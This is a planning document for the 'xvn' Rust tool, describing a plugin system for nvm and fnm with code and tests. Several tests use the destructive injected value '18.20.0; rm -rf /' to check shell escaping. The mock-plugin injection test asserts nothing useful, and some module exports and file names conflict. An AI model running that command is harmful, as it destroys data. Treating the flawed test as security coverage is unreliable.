# Milestone 2: Plugin System - Implementation Plan

**Timeline:** Weeks 3-4
**Status:** Planning
**Version:** v0.2.0

---

## Overview

This milestone establishes the plugin system that allows xvn to support multiple Node.js version managers (nvm, fnm, n, etc.) through a standardized trait interface. The plugin system is the core extensibility mechanism that enables xvn to work with any version manager.

### Goals

1. Define a clean `VersionManagerPlugin` trait that abstracts version manager operations
2. Implement built-in nvm and fnm plugins (compiled into binary)
3. Create a plugin registry that manages plugin lifecycle and priority ordering
4. Enable version detection, command generation, and availability checking
5. Establish testing patterns for plugin implementations

### Approach

- **Built-in plugins**: nvm and fnm plugins are compiled directly into the binary for optimal performance
- **Trait-based abstraction**: All plugins implement the same `VersionManagerPlugin` trait
- **Priority ordering**: Config file specifies plugin order; first available plugin wins
- **Lazy evaluation**: Plugins check availability only when needed
- **Testability**: Mock plugins enable testing without real version managers

---

## Prerequisites

- Milestone 1 (Core Infrastructure) must be complete
- Rust development environment set up
- Basic familiarity with Rust traits and dynamic dispatch

---

## Implementation Tasks

### Task M2.1: Define Plugin Trait (VersionManagerPlugin)

**Objective:** Create the trait definition that all version manager plugins must implement.

**Implementation Steps:**

1. Create the module structure:
   ```
   src/
   └── plugins/
       ├── mod.rs        # Public module exports
       ├── trait.rs      # VersionManagerPlugin trait definition
       ├── registry.rs   # Plugin registry (created in M2.4)
       ├── nvm.rs        # nvm plugin (created in M2.2)
       └── fnm.rs        # fnm plugin (created in M2.3)
   ```

2. Create `src/plugins/mod.rs`:
   ```rust
   mod trait_def;
   mod registry;
   mod nvm;
   mod fnm;

   pub use trait_def::VersionManagerPlugin;
   pub use registry::PluginRegistry;
   pub use nvm::NvmPlugin;
   pub use fnm::FnmPlugin;
   ```

3. Define the trait in `src/plugins/trait_def.rs`:
   ```rust
   use anyhow::Result;
   use std::fmt::Debug;

   /// Trait that all version manager plugins must implement
   ///
   /// This trait defines the interface for interacting with Node.js version managers
   /// like nvm, fnm, n, asdf, volta, etc.
   pub trait VersionManagerPlugin: Debug + Send + Sync {
       /// Returns the name of this plugin (e.g., "nvm", "fnm")
       fn name(&self) -> &str;

       /// Returns the list of version file names this plugin supports
       ///
       /// This is informational only - the actual version files searched for are
       /// determined by the user's config (`config.version_files`). This method
       /// indicates which files the plugin is *capable* of supporting.
       ///
       /// Example: nvm returns [".nvmrc"], fnm might return [".nvmrc", ".node-version"]
       ///
       /// **Note**: In Milestone 2, this method is not actively used by the activation
       /// logic. It's provided for future features (e.g., `xvn doctor` to suggest
       /// plugins based on version files found).
       fn version_files(&self) -> Vec<&str>;

       /// Checks if this version manager is available on the system
       ///
       /// This is called to determine if the plugin can be used. Should be fast
       /// and cache results when possible.
       ///
       /// # Returns
       /// - `Ok(true)` if the version manager is installed and functional
       /// - `Ok(false)` if the version manager is not available
       /// - `Err(_)` only for unexpected errors (not for "not installed")
       fn is_available(&self) -> Result<bool>;

       /// Checks if a specific Node.js version is installed by this version manager
       ///
       /// # Arguments
       /// * `version` - The version string (e.g., "18.20.0", "lts/hydrogen")
       ///
       /// # Returns
       /// - `Ok(true)` if the version is installed
       /// - `Ok(false)` if the version is not installed
       /// - `Err(_)` if unable to determine (e.g., version manager not available)
       fn has_version(&self, version: &str) -> Result<bool>;

       /// Generates the shell command to activate a specific version
       ///
       /// The returned command will be executed in the user's shell to switch
       /// Node.js versions.
       ///
       /// # Arguments
       /// * `version` - The version to activate
       ///
       /// # Returns
       /// The shell command as a string (e.g., "nvm use 18.20.0")
       ///
       /// # Security
       /// Must properly escape version strings to prevent command injection
       fn activate_command(&self, version: &str) -> Result<String>;

       /// Generates the shell command to install a specific version
       ///
       /// The returned command will be presented to the user (and potentially
       /// executed if auto_install is enabled).
       ///
       /// # Arguments
       /// * `version` - The version to install
       ///
       /// # Returns
       /// The shell command as a string (e.g., "nvm install 18.20.0")
       ///
       /// # Security
       /// Must properly escape version strings to prevent command injection
       fn install_command(&self, version: &str) -> Result<String>;

       /// Resolves a version string to a concrete version
       ///
       /// For example, resolves "lts/hydrogen" to "18.20.0" or "latest" to "21.0.0".
       ///
       /// Default implementation returns the version unchanged.
       ///
       /// # Arguments
       /// * `version` - The version string to resolve
       ///
       /// # Returns
       /// The resolved version string
       fn resolve_version(&self, version: &str) -> Result<String> {
           // Default implementation: return version as-is
           Ok(version.to_string())
       }
   }
   ```

4. Update `src/lib.rs` to expose the plugins module:
   ```rust
   pub mod plugins;

   // Re-export key types
   pub use plugins::VersionManagerPlugin;
   ```

**Code Structure:**

- **File**: `src/plugins/trait_def.rs`
  - `VersionManagerPlugin` trait with 7 methods
  - Comprehensive documentation for each method
  - Default implementation for `resolve_version()`

- **File**: `src/plugins/mod.rs`
  - Module exports and re-exports
  - Public API surface for the plugins module

**Key Considerations:**

- **Thread safety**: Trait requires `Send + Sync` for future concurrency
- **Security**: All command generation methods must prevent command injection
- **Performance**: `is_available()` should be fast and cacheable
- **Error handling**: Use `Result<bool>` not `Result<()>` for existence checks
- **Default implementations**: Only `resolve_version()` has a default (most plugins don't need custom resolution)

**Testing:**

Tests will be written after implementing concrete plugins (M2.2, M2.3).

**Dependencies:**

- **Requires**: Milestone 1 complete
- **Enables**: M2.2 (nvm plugin), M2.3 (fnm plugin), M2.4 (plugin registry)

---

### Task M2.2: Implement NVM Plugin

**Objective:** Create a fully functional nvm plugin that detects nvm and generates appropriate commands.

**Implementation Steps:**

1. Create `src/plugins/nvm.rs`:
   ```rust
   use super::VersionManagerPlugin;
   use anyhow::{Context, Result};
   use log::{debug, trace};
   use std::path::PathBuf;
   use std::process::Command;

   /// Plugin for Node Version Manager (nvm)
   ///
   /// Detects nvm by checking for ~/.nvm directory and nvm.sh script.
   /// Uses bash to source nvm.sh and execute nvm commands.
   #[derive(Debug, Clone)]
   pub struct NvmPlugin {
       /// Cached availability status (None = not yet checked)
       available: std::sync::Arc<std::sync::Mutex<Option<bool>>>,
   }

   impl NvmPlugin {
       /// Create a new NvmPlugin instance
       pub fn new() -> Self {
           Self {
               available: std::sync::Arc::new(std::sync::Mutex::new(None)),
           }
       }

       /// Get the path to nvm.sh
       fn nvm_sh_path(&self) -> Result<PathBuf> {
           let home = dirs::home_dir()
               .ok_or_else(|| anyhow::anyhow!("cannot determine home directory"))?;

           Ok(home.join(".nvm").join("nvm.sh"))
       }

       /// Execute an nvm command by sourcing nvm.sh first
       fn run_nvm_command(&self, nvm_command: &str) -> Result<String> {
           let nvm_sh = self.nvm_sh_path()?;

           let script = format!(
               "source {} > /dev/null 2>&1 && {}",
               shell_escape::escape(nvm_sh.to_string_lossy().into_owned().into()),
               nvm_command
           );

           trace!("Executing nvm command: {}", script);

           let output = Command::new("bash")
               .arg("-c")
               .arg(&script)
               .output()
               .context("failed to execute nvm command")?;

           if output.status.success() {
               let stdout = String::from_utf8_lossy(&output.stdout).trim().to_string();
               Ok(stdout)
           } else {
               let stderr = String::from_utf8_lossy(&output.stderr);
               anyhow::bail!("nvm command failed: {}", stderr)
           }
       }

       /// Escape a version string for safe shell usage
       fn escape_version(version: &str) -> String {
           shell_escape::escape(version.into()).to_string()
       }
   }

   impl Default for NvmPlugin {
       fn default() -> Self {
           Self::new()
       }
   }

   impl VersionManagerPlugin for NvmPlugin {
       fn name(&self) -> &str {
           "nvm"
       }

       fn version_files(&self) -> Vec<&str> {
           vec![".nvmrc"]
       }

       fn is_available(&self) -> Result<bool> {
           // Check cache first
           {
               let cache = self.available.lock().unwrap();
               if let Some(available) = *cache {
                   trace!("nvm availability (cached): {}", available);
                   return Ok(available);
               }
           }

           // Check if nvm.sh exists
           let nvm_sh = self.nvm_sh_path()?;
           let available = nvm_sh.exists() && nvm_sh.is_file();

           debug!("nvm availability: {} (checked {})", available, nvm_sh.display());

           // Cache result
           {
               let mut cache = self.available.lock().unwrap();
               *cache = Some(available);
           }

           Ok(available)
       }

       fn has_version(&self, version: &str) -> Result<bool> {
           if !self.is_available()? {
               return Ok(false);
           }

           let escaped_version = Self::escape_version(version);
           let command = format!("nvm which {}", escaped_version);

           match self.run_nvm_command(&command) {
               Ok(output) => {
                   // nvm which returns a path if version is installed
                   let has_it = !output.is_empty() && !output.contains("N/A");
                   debug!("nvm has version {}: {}", version, has_it);
                   Ok(has_it)
               }
               Err(_) => {
                   // Command failed = version not installed
                   debug!("nvm has version {}: false (command failed)", version);
                   Ok(false)
               }
           }
       }

       fn activate_command(&self, version: &str) -> Result<String> {
           let escaped = Self::escape_version(version);
           Ok(format!("nvm use {}", escaped))
       }

       fn install_command(&self, version: &str) -> Result<String> {
           let escaped = Self::escape_version(version);
           Ok(format!("nvm install {}", escaped))
       }

       fn resolve_version(&self, version: &str) -> Result<String> {
           // nvm can resolve aliases like "lts/hydrogen" to concrete versions
           if !self.is_available()? {
               // If nvm not available, just return version as-is
               return Ok(version.to_string());
           }

           let escaped = Self::escape_version(version);
           let command = format!("nvm version {}", escaped);

           match self.run_nvm_command(&command) {
               Ok(output) => {
                   let resolved = output.trim().trim_start_matches('v');
                   if resolved.is_empty() || resolved.contains("N/A") {
                       // Couldn't resolve, return original
                       Ok(version.to_string())
                   } else {
                       debug!("nvm resolved {} to {}", version, resolved);
                       Ok(resolved.to_string())
                   }
               }
               Err(_) => {
                   // Resolution failed, return original
                   Ok(version.to_string())
               }
           }
       }
   }
   ```

2. Add the `shell-escape` dependency to `Cargo.toml`:
   ```toml
   [dependencies]
   shell-escape = "0.1"
   ```

3. Create basic tests in `src/plugins/nvm.rs` (within `#[cfg(test)]`):
   ```rust
   #[cfg(test)]
   mod tests {
       use super::*;

       #[test]
       fn test_nvm_plugin_name() {
           let plugin = NvmPlugin::new();
           assert_eq!(plugin.name(), "nvm");
       }

       #[test]
       fn test_nvm_version_files() {
           let plugin = NvmPlugin::new();
           assert_eq!(plugin.version_files(), vec![".nvmrc"]);
       }

       #[test]
       fn test_activate_command() {
           let plugin = NvmPlugin::new();
           let cmd = plugin.activate_command("18.20.0").unwrap();
           assert_eq!(cmd, "nvm use 18.20.0");
       }

       #[test]
       fn test_install_command() {
           let plugin = NvmPlugin::new();
           let cmd = plugin.install_command("18.20.0").unwrap();
           assert_eq!(cmd, "nvm install 18.20.0");
       }

       #[test]
       fn test_shell_escaping() {
           let plugin = NvmPlugin::new();
           // Test that special characters are escaped
           let cmd = plugin.activate_command("18.20.0; rm -rf /").unwrap();
           assert!(cmd.contains("'18.20.0; rm -rf /'") || cmd.contains("18.20.0\\;"));
       }
   }
   ```

**Code Structure:**

- **File**: `src/plugins/nvm.rs`
  - `NvmPlugin` struct with availability cache
  - Private helper methods (`nvm_sh_path`, `run_nvm_command`, `escape_version`)
  - Full `VersionManagerPlugin` trait implementation
  - Unit tests

**Key Considerations:**

- **Availability caching**: Check ~/.nvm/nvm.sh once, cache result in Arc<Mutex<Option<bool>>>
- **Shell sourcing**: nvm is a bash function, not a binary, so must source nvm.sh first
- **Command injection prevention**: Use `shell-escape` crate for all version strings
- **Error handling**: `has_version` returns `Ok(false)` for "not installed", not an error
- **Performance**: Avoid shelling out unnecessarily; cache when possible
- **Version resolution**: nvm supports aliases like "lts/hydrogen" - use `nvm version` to resolve

**Testing:**

- Unit tests verify command generation and escaping
- Integration tests (if nvm is installed) can test actual availability
- Mock tests will be added in M2.5

**Dependencies:**

- **Requires**: M2.1 (trait definition)
- **Enables**: M2.4 (can be registered), M2.5 (testing)

---

### Task M2.3: Implement FNM Plugin

**Objective:** Create a fully functional fnm plugin that detects fnm and generates appropriate commands.

**Implementation Steps:**

1. Create `src/plugins/fnm.rs`:
   ```rust
   use super::VersionManagerPlugin;
   use anyhow::{Context, Result};
   use log::{debug, trace};
   use std::process::Command;

   /// Plugin for Fast Node Manager (fnm)
   ///
   /// Detects fnm by running `fnm --version`.
   /// Uses fnm CLI commands directly (fnm is a binary, not a shell function).
   #[derive(Debug, Clone)]
   pub struct FnmPlugin {
       /// Cached availability status (None = not yet checked)
       available: std::sync::Arc<std::sync::Mutex<Option<bool>>>,
   }

   impl FnmPlugin {
       /// Create a new FnmPlugin instance
       pub fn new() -> Self {
           Self {
               available: std::sync::Arc::new(std::sync::Mutex::new(None)),
           }
       }

       /// Run an fnm command and capture output
       fn run_fnm_command(&self, args: &[&str]) -> Result<String> {
           trace!("Executing fnm command: fnm {}", args.join(" "));

           let output = Command::new("fnm")
               .args(args)
               .output()
               .context("failed to execute fnm command")?;

           if output.status.success() {
               let stdout = String::from_utf8_lossy(&output.stdout).trim().to_string();
               Ok(stdout)
           } else {
               let stderr = String::from_utf8_lossy(&output.stderr);
               anyhow::bail!("fnm command failed: {}", stderr)
           }
       }

       /// Parse fnm list output to check if a version is installed
       ///
       /// fnm list output format:
       /// * v18.20.0 default
       ///   v20.0.0
       ///   system
       fn parse_fnm_list(&self, output: &str, version: &str) -> bool {
           // Normalize version (with or without 'v' prefix)
           let version_without_v = version.trim_start_matches('v');
           let version_with_v = if version.starts_with('v') {
               version.to_string()
           } else {
               format!("v{}", version)
           };

           for line in output.lines() {
               let line = line.trim();

               // Skip system entry
               if line == "system" {
                   continue;
               }

               // Remove markers (* for active, default label, etc.)
               let version_part = line
                   .trim_start_matches('*')
                   .trim()
                   .split_whitespace()
                   .next()
                   .unwrap_or("");

               if version_part == version_with_v ||
                  version_part.trim_start_matches('v') == version_without_v {
                   return true;
               }
           }

           false
       }

       /// Escape a version string for safe shell usage
       fn escape_version(version: &str) -> String {
           shell_escape::escape(version.into()).to_string()
       }
   }

   impl Default for FnmPlugin {
       fn default() -> Self {
           Self::new()
       }
   }

   impl VersionManagerPlugin for FnmPlugin {
       fn name(&self) -> &str {
           "fnm"
       }

       fn version_files(&self) -> Vec<&str> {
           // fnm supports both .nvmrc and .node-version
           vec![".nvmrc", ".node-version"]
       }

       fn is_available(&self) -> Result<bool> {
           // Check cache first
           {
               let cache = self.available.lock().unwrap();
               if let Some(available) = *cache {
                   trace!("fnm availability (cached): {}", available);
                   return Ok(available);
               }
           }

           // Try to run fnm --version
           let available = match Command::new("fnm").arg("--version").output() {
               Ok(output) => output.status.success(),
               Err(_) => false,
           };

           debug!("fnm availability: {}", available);

           // Cache result
           {
               let mut cache = self.available.lock().unwrap();
               *cache = Some(available);
           }

           Ok(available)
       }

       fn has_version(&self, version: &str) -> Result<bool> {
           if !self.is_available()? {
               return Ok(false);
           }

           match self.run_fnm_command(&["list"]) {
               Ok(output) => {
                   let has_it = self.parse_fnm_list(&output, version);
                   debug!("fnm has version {}: {}", version, has_it);
                   Ok(has_it)
               }
               Err(e) => {
                   debug!("fnm list failed: {}", e);
                   Ok(false)
               }
           }
       }

       fn activate_command(&self, version: &str) -> Result<String> {
           let escaped = Self::escape_version(version);
           Ok(format!("fnm use {}", escaped))
       }

       fn install_command(&self, version: &str) -> Result<String> {
           let escaped = Self::escape_version(version);
           Ok(format!("fnm install {}", escaped))
       }

       fn resolve_version(&self, version: &str) -> Result<String> {
           // fnm doesn't have built-in alias resolution like nvm
           // Just return the version as-is
           Ok(version.to_string())
       }
   }
   ```

2. Add tests in `src/plugins/fnm.rs`:
   ```rust
   #[cfg(test)]
   mod tests {
       use super::*;

       #[test]
       fn test_fnm_plugin_name() {
           let plugin = FnmPlugin::new();
           assert_eq!(plugin.name(), "fnm");
       }

       #[test]
       fn test_fnm_version_files() {
           let plugin = FnmPlugin::new();
           assert_eq!(plugin.version_files(), vec![".nvmrc", ".node-version"]);
       }

       #[test]
       fn test_activate_command() {
           let plugin = FnmPlugin::new();
           let cmd = plugin.activate_command("18.20.0").unwrap();
           assert_eq!(cmd, "fnm use 18.20.0");
       }

       #[test]
       fn test_install_command() {
           let plugin = FnmPlugin::new();
           let cmd = plugin.install_command("18.20.0").unwrap();
           assert_eq!(cmd, "fnm install 18.20.0");
       }

       #[test]
       fn test_parse_fnm_list() {
           let plugin = FnmPlugin::new();

           let output = "* v18.20.0 default\n  v20.0.0\n  system";

           assert!(plugin.parse_fnm_list(output, "18.20.0"));
           assert!(plugin.parse_fnm_list(output, "v18.20.0"));
           assert!(plugin.parse_fnm_list(output, "20.0.0"));
           assert!(!plugin.parse_fnm_list(output, "16.0.0"));
       }

       #[test]
       fn test_shell_escaping() {
           let plugin = FnmPlugin::new();
           let cmd = plugin.activate_command("18.20.0; rm -rf /").unwrap();
           assert!(cmd.contains("'18.20.0; rm -rf /'") || cmd.contains("18.20.0\\;"));
       }
   }
   ```

**Code Structure:**

- **File**: `src/plugins/fnm.rs`
  - `FnmPlugin` struct with availability cache
  - Private helper methods (`run_fnm_command`, `parse_fnm_list`, `escape_version`)
  - Full `VersionManagerPlugin` trait implementation
  - Unit tests for command generation and parsing

**Key Considerations:**

- **Binary vs function**: fnm is a standalone binary, simpler than nvm (no sourcing needed)
- **Version detection**: Parse `fnm list` output to check if version is installed
- **Version format flexibility**: Handle both "18.20.0" and "v18.20.0" formats
- **Multiple version files**: fnm supports both .nvmrc and .node-version
- **Command injection prevention**: Use shell-escape for all version strings
- **Performance**: Cache availability, minimize command execution

**Testing:**

- Unit tests verify command generation and list parsing
- Integration tests (if fnm is installed) can test actual availability
- Mock tests will be added in M2.5

**Dependencies:**

- **Requires**: M2.1 (trait definition)
- **Enables**: M2.4 (can be registered), M2.5 (testing)

---

### Task M2.4: Implement Plugin Registry

**Objective:** Create a registry that manages plugin lifecycle, priority ordering, and discovery.

**Implementation Steps:**

1. Create `src/plugins/registry.rs`:
   ```rust
   use super::{VersionManagerPlugin, NvmPlugin, FnmPlugin};
   use anyhow::{Context, Result};
   use log::{debug, info};
   use std::sync::Arc;

   /// Registry for managing version manager plugins
   ///
   /// Responsibilities:
   /// - Load built-in plugins (nvm, fnm)
   /// - Maintain priority ordering based on config
   /// - Find the first available plugin for a given version
   /// - Cache plugin instances
   #[derive(Debug)]
   pub struct PluginRegistry {
       /// Ordered list of plugins (priority order from config)
       plugins: Vec<Arc<dyn VersionManagerPlugin>>,
   }

   impl PluginRegistry {
       /// Create a new plugin registry
       ///
       /// # Arguments
       /// * `plugin_names` - List of plugin names in priority order (from config)
       pub fn new(plugin_names: &[String]) -> Self {
           info!("Initializing plugin registry with: {:?}", plugin_names);

           let mut plugins: Vec<Arc<dyn VersionManagerPlugin>> = Vec::new();

           for name in plugin_names {
               match name.as_str() {
                   "nvm" => {
                       debug!("Loading nvm plugin");
                       plugins.push(Arc::new(NvmPlugin::new()));
                   }
                   "fnm" => {
                       debug!("Loading fnm plugin");
                       plugins.push(Arc::new(FnmPlugin::new()));
                   }
                   _ => {
                       log::warn!("Unknown plugin '{}' in config (ignoring)", name);
                   }
               }
           }

           if plugins.is_empty() {
               log::warn!("No valid plugins loaded! Version switching will not work.");
           }

           Self { plugins }
       }

       /// Get all registered plugins
       pub fn plugins(&self) -> &[Arc<dyn VersionManagerPlugin>] {
           &self.plugins
       }

       /// Find the first available plugin
       ///
       /// Returns the first plugin in priority order that reports is_available() = true.
       ///
       /// # Returns
       /// - `Ok(Some(plugin))` - First available plugin
       /// - `Ok(None)` - No plugins are available
       /// - `Err(_)` - Error checking availability
       pub fn find_available_plugin(&self) -> Result<Option<Arc<dyn VersionManagerPlugin>>> {
           debug!("Searching for available plugin...");

           for plugin in &self.plugins {
               match plugin.is_available() {
                   Ok(true) => {
                       info!("Found available plugin: {}", plugin.name());
                       return Ok(Some(Arc::clone(plugin)));
                   }
                   Ok(false) => {
                       debug!("Plugin {} not available", plugin.name());
                   }
                   Err(e) => {
                       log::warn!("Error checking availability for {}: {}", plugin.name(), e);
                   }
               }
           }

           debug!("No available plugins found");
           Ok(None)
       }

       /// Find a plugin that has the specified version installed
       ///
       /// Returns the first plugin (in priority order) that:
       /// 1. Is available on the system
       /// 2. Has the specified version installed
       ///
       /// # Arguments
       /// * `version` - The Node.js version to look for
       ///
       /// # Returns
       /// - `Ok(Some(plugin))` - First plugin with this version
       /// - `Ok(None)` - No plugin has this version installed
       /// - `Err(_)` - Error checking plugins
       pub fn find_plugin_with_version(
           &self,
           version: &str,
       ) -> Result<Option<Arc<dyn VersionManagerPlugin>>> {
           debug!("Searching for plugin with version {}...", version);

           for plugin in &self.plugins {
               // Skip if plugin not available
               if !plugin.is_available().unwrap_or(false) {
                   continue;
               }

               match plugin.has_version(version) {
                   Ok(true) => {
                       info!("Found plugin {} with version {}", plugin.name(), version);
                       return Ok(Some(Arc::clone(plugin)));
                   }
                   Ok(false) => {
                       debug!("Plugin {} does not have version {}", plugin.name(), version);
                   }
                   Err(e) => {
                       log::warn!(
                           "Error checking version {} on {}: {}",
                           version,
                           plugin.name(),
                           e
                       );
                   }
               }
           }

           debug!("No plugin has version {}", version);
           Ok(None)
       }

       /// Get list of all available plugins
       ///
       /// Returns plugins that report is_available() = true.
       pub fn available_plugins(&self) -> Vec<Arc<dyn VersionManagerPlugin>> {
           self.plugins
               .iter()
               .filter(|plugin| plugin.is_available().unwrap_or(false))
               .map(Arc::clone)
               .collect()
       }

       /// Get a plugin by name
       pub fn get_plugin(&self, name: &str) -> Option<Arc<dyn VersionManagerPlugin>> {
           self.plugins
               .iter()
               .find(|plugin| plugin.name() == name)
               .map(Arc::clone)
       }
   }

   impl Default for PluginRegistry {
       fn default() -> Self {
           // Default to nvm, fnm priority order
           Self::new(&["nvm".to_string(), "fnm".to_string()])
       }
   }
   ```

2. Add tests in `src/plugins/registry.rs`:
   ```rust
   #[cfg(test)]
   mod tests {
       use super::*;

       #[test]
       fn test_registry_loads_plugins() {
           let registry = PluginRegistry::new(&["nvm".to_string(), "fnm".to_string()]);
           assert_eq!(registry.plugins().len(), 2);
       }

       #[test]
       fn test_registry_ignores_unknown_plugins() {
           let registry = PluginRegistry::new(&[
               "nvm".to_string(),
               "unknown".to_string(),
               "fnm".to_string(),
           ]);
           // Should only load nvm and fnm, ignore unknown
           assert_eq!(registry.plugins().len(), 2);
       }

       #[test]
       fn test_registry_respects_priority_order() {
           let registry = PluginRegistry::new(&["fnm".to_string(), "nvm".to_string()]);
           let plugins = registry.plugins();

           assert_eq!(plugins[0].name(), "fnm");
           assert_eq!(plugins[1].name(), "nvm");
       }

       #[test]
       fn test_get_plugin_by_name() {
           let registry = PluginRegistry::new(&["nvm".to_string(), "fnm".to_string()]);

           let nvm = registry.get_plugin("nvm");
           assert!(nvm.is_some());
           assert_eq!(nvm.unwrap().name(), "nvm");

           let unknown = registry.get_plugin("unknown");
           assert!(unknown.is_none());
       }

       #[test]
       fn test_default_registry() {
           let registry = PluginRegistry::default();
           assert_eq!(registry.plugins().len(), 2);
           assert_eq!(registry.plugins()[0].name(), "nvm");
           assert_eq!(registry.plugins()[1].name(), "fnm");
       }
   }
   ```

3. Update `src/plugins/mod.rs` to export the registry:
   ```rust
   mod trait_def;
   mod registry;
   mod nvm;
   mod fnm;

   pub use trait_def::VersionManagerPlugin;
   pub use registry::PluginRegistry;
   pub use nvm::NvmPlugin;
   pub use fnm::FnmPlugin;
   ```

4. Integrate with the activate command in `src/cli.rs`:
   ```rust
   // At top of file, add these imports:
   use crate::plugins::PluginRegistry;

   // In the activate command handler:
   Some(Commands::Activate { path }) => {
       info!("Running activate command for path: {path:?}");

       // Load config to get version file names and plugin order
       let config = crate::config::Config::load()
           .context("failed to load configuration")?;

       // Find version file
       match crate::version_file::VersionFile::find(&path, &config.version_files) {
           Ok(Some(version_file)) => {
               println!("Found version file: {}", version_file.path.display());
               println!("Node.js version: {}", version_file.version);

               // Create plugin registry
               let registry = crate::plugins::PluginRegistry::new(&config.plugins);

               // Find a plugin that has this version
               match registry.find_plugin_with_version(&version_file.version) {
                   Ok(Some(plugin)) => {
                       println!("Using plugin: {}", plugin.name());

                       // Generate activation command
                       match plugin.activate_command(&version_file.version) {
                           Ok(cmd) => {
                               println!("Activation command: {}", cmd);
                               println!("\n(Actual activation requires shell integration - Milestone 3)");
                           }
                           Err(e) => {
                               eprintln!("Failed to generate activation command: {}", e);
                               std::process::exit(1);
                           }
                       }
                   }
                   Ok(None) => {
                       println!("\nVersion {} not installed.", version_file.version);

                       // Find first available plugin for install suggestion
                       if let Ok(Some(plugin)) = registry.find_available_plugin() {
                           if let Ok(install_cmd) = plugin.install_command(&version_file.version) {
                               println!("To install: {}", install_cmd);
                           }
                       }
                   }
                   Err(e) => {
                       eprintln!("Error checking plugins: {}", e);
                       std::process::exit(1);
                   }
               }
           }
           Ok(None) => {
               println!("No version file found in {} or parent directories", path.display());
               std::process::exit(1);
           }
           Err(e) => {
               eprintln!("Error: {e}");
               std::process::exit(1);
           }
       }

       Ok(())
   }
   ```

**Code Structure:**

- **File**: `src/plugins/registry.rs`
  - `PluginRegistry` struct with plugin list
  - Methods: `new()`, `find_available_plugin()`, `find_plugin_with_version()`, `available_plugins()`, `get_plugin()`
  - Unit tests for plugin loading and priority

- **File**: `src/cli.rs` (updated)
  - Integrate registry into activate command
  - Display plugin selection and commands

**Key Considerations:**

- **Priority ordering**: Config specifies order, first available wins
- **Arc for sharing**: Plugins wrapped in Arc for cheap cloning
- **Trait objects**: Use `Arc<dyn VersionManagerPlugin>` for dynamic dispatch
- **Error handling**: Log warnings for plugin errors, don't fail hard
- **Lazy evaluation**: Only check availability when needed
- **Extensibility**: Easy to add more built-in plugins in the future

**Testing:**

- Unit tests verify plugin loading and priority ordering
- Integration tests will verify actual plugin selection with config
- Mock plugins (M2.5) will enable comprehensive testing

**Dependencies:**

- **Requires**: M2.1 (trait), M2.2 (nvm), M2.3 (fnm)
- **Enables**: M2.5 (testing), Milestone 3 (shell integration)

---

### Task M2.5: Unit Tests for Plugin System

**Objective:** Create comprehensive tests for the plugin system, including a mock plugin for testing.

**Implementation Steps:**

1. Create a mock plugin in `src/plugins/mock.rs`:
   ```rust
   use super::VersionManagerPlugin;
   use anyhow::Result;
   use std::collections::HashSet;

   /// Mock plugin for testing
   ///
   /// Allows tests to control availability and installed versions without
   /// requiring actual version managers.
   #[derive(Debug, Clone)]
   pub struct MockPlugin {
       name: String,
       available: bool,
       installed_versions: HashSet<String>,
   }

   impl MockPlugin {
       /// Create a new mock plugin
       pub fn new(name: impl Into<String>) -> Self {
           Self {
               name: name.into(),
               available: true,
               installed_versions: HashSet::new(),
           }
       }

       /// Set availability
       pub fn with_availability(mut self, available: bool) -> Self {
           self.available = available;
           self
       }

       /// Add an installed version
       pub fn with_version(mut self, version: impl Into<String>) -> Self {
           self.installed_versions.insert(version.into());
           self
       }

       /// Add multiple installed versions
       pub fn with_versions(mut self, versions: &[&str]) -> Self {
           for version in versions {
               self.installed_versions.insert(version.to_string());
           }
           self
       }
   }

   impl VersionManagerPlugin for MockPlugin {
       fn name(&self) -> &str {
           &self.name
       }

       fn version_files(&self) -> Vec<&str> {
           vec![".nvmrc"]
       }

       fn is_available(&self) -> Result<bool> {
           Ok(self.available)
       }

       fn has_version(&self, version: &str) -> Result<bool> {
           Ok(self.installed_versions.contains(version))
       }

       fn activate_command(&self, version: &str) -> Result<String> {
           Ok(format!("{} use {}", self.name, version))
       }

       fn install_command(&self, version: &str) -> Result<String> {
           Ok(format!("{} install {}", self.name, version))
       }
   }
   ```

2. Update `src/plugins/mod.rs`:
   ```rust
   mod trait_def;
   mod registry;
   mod nvm;
   mod fnm;

   #[cfg(test)]
   mod mock;

   pub use trait_def::VersionManagerPlugin;
   pub use registry::PluginRegistry;
   pub use nvm::NvmPlugin;
   pub use fnm::FnmPlugin;

   #[cfg(test)]
   pub use mock::MockPlugin;
   ```

3. Create comprehensive integration tests in `tests/plugin_test.rs`:
   ```rust
   use xvn::plugins::{MockPlugin, PluginRegistry, VersionManagerPlugin};
   use std::sync::Arc;

   #[test]
   fn test_mock_plugin_basic() {
       let plugin = MockPlugin::new("test")
           .with_version("18.20.0")
           .with_version("20.0.0");

       assert_eq!(plugin.name(), "test");
       assert!(plugin.is_available().unwrap());
       assert!(plugin.has_version("18.20.0").unwrap());
       assert!(plugin.has_version("20.0.0").unwrap());
       assert!(!plugin.has_version("16.0.0").unwrap());
   }

   #[test]
   fn test_mock_plugin_unavailable() {
       let plugin = MockPlugin::new("test")
           .with_availability(false)
           .with_version("18.20.0");

       assert!(!plugin.is_available().unwrap());
       // Even though version is "installed", plugin is unavailable
       assert!(plugin.has_version("18.20.0").unwrap());
   }

   #[test]
   fn test_mock_plugin_commands() {
       let plugin = MockPlugin::new("testvm");

       assert_eq!(
           plugin.activate_command("18.20.0").unwrap(),
           "testvm use 18.20.0"
       );
       assert_eq!(
           plugin.install_command("18.20.0").unwrap(),
           "testvm install 18.20.0"
       );
   }

   #[test]
   fn test_registry_with_mock_plugins() {
       // Can't easily test registry with mocks since PluginRegistry::new
       // only loads built-in plugins. This is a limitation we'll note.
       // For now, test that the built-in registry works.
       let registry = PluginRegistry::new(&["nvm".to_string(), "fnm".to_string()]);
       assert_eq!(registry.plugins().len(), 2);
   }

   #[test]
   fn test_plugin_priority_with_mocks() {
       // Manual test of priority logic using mock plugins directly
       let plugins: Vec<Arc<dyn VersionManagerPlugin>> = vec![
           Arc::new(MockPlugin::new("first").with_version("18.20.0")),
           Arc::new(MockPlugin::new("second").with_version("18.20.0")),
       ];

       // First available with version should be returned
       let found = plugins.iter().find(|p| {
           p.is_available().unwrap_or(false) && p.has_version("18.20.0").unwrap_or(false)
       });

       assert!(found.is_some());
       assert_eq!(found.unwrap().name(), "first");
   }

   #[test]
   fn test_plugin_command_injection_prevention() {
       // Test that shell escaping works
       let plugin = MockPlugin::new("test");

       let malicious_version = "18.20.0; rm -rf /";
       let cmd = plugin.activate_command(malicious_version).unwrap();

       // Command should contain the escaped version, not execute it
       assert!(cmd.contains("test use"));
       // The version string should be present but escaped
       assert!(cmd.contains(malicious_version));
   }
   ```

4. Add shell escaping tests in `tests/security_test.rs`:
   ```rust
   use xvn::plugins::{NvmPlugin, FnmPlugin, VersionManagerPlugin};

   #[test]
